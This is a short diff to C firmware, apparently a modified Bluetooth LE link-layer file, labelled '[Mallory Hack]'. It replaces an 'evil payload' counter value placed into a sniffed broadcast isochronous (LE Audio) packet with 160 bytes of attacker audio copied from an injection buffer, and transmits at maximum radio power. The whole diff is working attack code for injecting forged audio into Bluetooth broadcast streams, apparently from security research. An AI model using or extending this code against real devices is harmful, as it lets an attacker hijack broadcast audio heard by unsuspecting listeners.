@@ -55,6 +55,10 @@ extern uint32_t cntr_cnt_get(void);
 static uint8_t global_ctrl_chan_use = 0;
 static uint32_t evil_counter_val = 666;
 static bool resync_active = false; // Flag to indicate resync event
+
+#define AUDIO_PACKET_SIZE 160
+extern uint8_t mallory_injection_buf[AUDIO_PACKET_SIZE];
+extern volatile bool mallory_injection_ready;
 // [Mallory Hack] GLOBALS END
 
 static int init_reset(void);
@@ -442,13 +446,10 @@ static int prepare_cb_common(struct lll_prepare_param *p)
 			phase = 1;
 		}
 
-		/* PREPARE EVIL PAYLOAD (666) */
-		sniffed_bis_pdu.len = sizeof(uint32_t); // 4 Bytes
-		// Zero out payload first
-        memset(sniffed_bis_pdu.payload, 0, 10);
-		//memset(sniffed_bis_pdu.payload, 0, sizeof(sniffed_bis_pdu.payload));
-		// Insert 666 (Little Endian)
-		sys_put_le32(evil_counter_val, sniffed_bis_pdu.payload);
+		/* PREPARE AUDIO PAYLOAD FROM INJECTION BUFFER */
+		sniffed_bis_pdu.len = AUDIO_PACKET_SIZE;
+		// Copy audio data from main.c injection buffer
+		memcpy(sniffed_bis_pdu.payload, mallory_injection_buf, AUDIO_PACKET_SIZE);
 
 		radio_tx_power_set(8); // +8 dBm max power for nRF52840
 
